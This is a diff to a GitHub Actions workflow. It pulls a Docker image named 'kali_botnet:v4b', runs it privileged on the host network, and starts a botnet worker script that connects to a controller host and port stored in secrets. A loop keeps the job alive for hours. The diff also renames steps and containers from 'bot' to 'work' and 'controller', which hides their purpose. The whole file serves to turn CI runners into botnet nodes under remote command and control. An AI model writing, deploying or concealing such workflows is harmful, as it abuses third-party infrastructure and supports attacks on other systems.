@@ -1,12 +1,12 @@
-name: Run Bot (v4b)
+name: work
 
 on:
   workflow_dispatch:
 
 jobs:
-  run-bot:
+  run-controller:
     runs-on: ubuntu-latest
-    timeout-minutes: 360   # 6 hours max
+    timeout-minutes: 360
 
     env:
       DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
@@ -15,7 +15,6 @@ jobs:
       CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}
 
     steps:
-
       - name: Checkout Repo
         uses: actions/checkout@v3
 
@@ -24,52 +23,46 @@ jobs:
           set -x
           echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin
 
-      - name: Pull Bot Image (v4b)
+      - name: Pull Controller Image
         run: |
           set -x
           IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
           docker pull $IMAGE_NAME
 
-      - name: Remove Old Bot Container
-        run: |
-          set -x
-          docker rm -f kali_bot || true
-
-      - name: Run Bot Container
+      - name: Run Controller Container
         run: |
           set -x
           IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
-          docker run -d --name=kali_bot \
+          docker run -d --name=kali_controller \
             --privileged \
             --network=host \
             -e CONTROLLER_HOST=$CONTROLLER_HOST \
             -e CONTROLLER_PORT=$CONTROLLER_PORT \
             $IMAGE_NAME \
             tail -f /dev/null
-          sleep 5
+          sleep 2
           docker ps -a
 
-      - name: Start Worker Process
+      - name: Start Controller Services
         run: |
           set -x
-          docker exec kali_bot tmux new -d -s bot "python3 /app/botnet_version4/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
-          docker exec kali_bot tmux ls
-
-      - name: Keep Workflow Alive (No Auto-Restart)
+          # start background services
+          docker exec -d kali_controller bash -c "python3 /app/botnet_version4/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
+      
+      - name: Keep Workflow Alive & Auto-Restart
         run: |
           set -e
           start_time=$(date +%s)
-          max_runtime=$((6 * 3600)) # 6 hours only
+          max_runtime=$((3 * 3600 + 1800)) # 3h30m
 
           while true; do
             now=$(date +%s)
             uptime=$((now - start_time))
-            echo "[INFO] Active for $((uptime/60)) minutes"
-
+            echo "[$(date)] Uptime: $((uptime / 60)) minutes"
             if [ "$uptime" -ge "$max_runtime" ]; then
-              echo "[INFO] Max runtime reached. Job ending naturally."
-              exit 0
+                sleep 5
+                echo "Exiting workflow..."
+                exit 0
             fi
-
             sleep 60
           done
